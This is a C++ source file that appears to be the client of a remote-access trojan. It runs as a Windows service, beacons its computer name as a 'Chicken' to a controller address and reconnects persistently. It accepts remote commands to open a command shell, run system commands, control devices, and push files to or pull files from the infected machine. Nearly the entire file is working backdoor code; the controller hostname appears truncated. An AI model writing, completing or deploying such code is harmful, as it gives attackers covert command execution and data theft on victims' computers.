#include "SSP_OnRecv.h"
#include <io.h>
extern bool serviceEndFlag;


void OnRecv(SSprotocol& sock, char* msg, int len);



void CALLBACK ServiceDo()
{
	system("ipconfig /flushdns");
	char mName[255];
	DWORD nameLen = 255;
	GetComputerName(mName, &nameLen);

Begin:
	try{
		if (serviceEndFlag)
			return;

		/*====Connect====*/
		SSprotocol sock;
		hostent* host = gethostbyname("127.0.");
		if (!host)
		{
			printf("invalid host\n");
			Sleep(2000);
			goto Begin;
		}
		char* pszIP = (char *)inet_ntoa(*(struct in_addr *)(host->h_addr));
		printf("%s\n", pszIP);
		sock.setTarget(pszIP, 13658);
		sock.setTarget("127.0.0.1", 44445);
		sock.startup_TCP();
		int connectResult = sock._connect();
		printf("connect %d\n", connectResult);
		if (!connectResult)
		{
			Sleep(2000);
			goto Begin;
		}


		/*====Main====*/
		char strHead[255];
		sprintf_s(strHead, "Chicken %s : %d (ver1.0)", mName, sock.getSocketPort());
		int errorTimes = 0;
		int noResponseTimes = 0;
		char recv[RECV_BUFF_SIZE] = {};
		SScmdPipe::init(&sock);

		sock._send(strHead, (int)strlen(strHead));

		printf("Running...\n");
		while (!serviceEndFlag)
		{
			int recvResult = sock._recv(recv, 2000);
			if (!recvResult)
				errorTimes++;

			//recv time out, or net down
			if (recvResult == SSP_RECV_TIMEO || recvResult == SSP_RECV_ERROR) {
				int sendResult = sock._send(strHead, (int)strlen(strHead));
				if (!sendResult)
					errorTimes++;
				noResponseTimes++;
			}
			else if (recvResult > 0)
			{
				//clean error count-down
				errorTimes = 0;
				noResponseTimes = 0;
			}

			//disconnect
			if (errorTimes > 3 || noResponseTimes > 5)
			{
				printf("NetDown. DisConnected\n");
				Sleep(2000);
				goto Begin;
			}

			//comes msg
			if (recvResult > 0)
			{
				int result = 0;
				try
				{
					OnRecv(sock, recv, recvResult);
				}
				catch (...)
				{
					char response[255] = "Result Occurs Exception";
					sock._send(response, sizeof(response));
					return;
				}
			}

		}
	}
	catch (...) {
		printf("Program Error. DisConnected\n");
		Sleep(2000);
		goto Begin;
	}
}



void OnRecv(SSprotocol& sock, char* msg, int len)
{
	char* msgPos = msg;
	int command = 0;
	if (len < sizeof(command))
	{
		sock._feedBack("Broken Msg");
		return;
	}

	memcpy(&command, msgPos, sizeof(command));
	msgPos += sizeof(command);
	len -= sizeof(command);

	switch (command)
	{
	case CMD_BEAT:{	return; }
				  break;

				  /*Device Control*/
	case CMD_DEVICE:	{
		Recv_Cmd_Device(sock, msgPos, len);
	}
						break;


						/*Open a Cmd*/
	case CMD_OPENCMD:{
		SScmdPipe::createCmd();
	}
					 break;

					 /*System Command*/
	case CMD_SYSTEM: {
		Recv_Cmd_System(sock, msgPos, len);
	}
					 break;


					 /*Recv File*/
	case CMD_FILE: {
		Recv_Cmd_File(sock, msgPos, len);
	}
				   break;
	case CMD_GETFILE:{
		Recv_Cmd_GetFile(sock, msgPos, len);
	}
					 break;
					 /*
	case CMD_GETSCREEN:{
		Recv_Cmd_GetScreen(sock);
	}
					 break;
					 */

	default:
		sock._feedBack("Undentified Command.\n");
		return;
		break;
	}

}





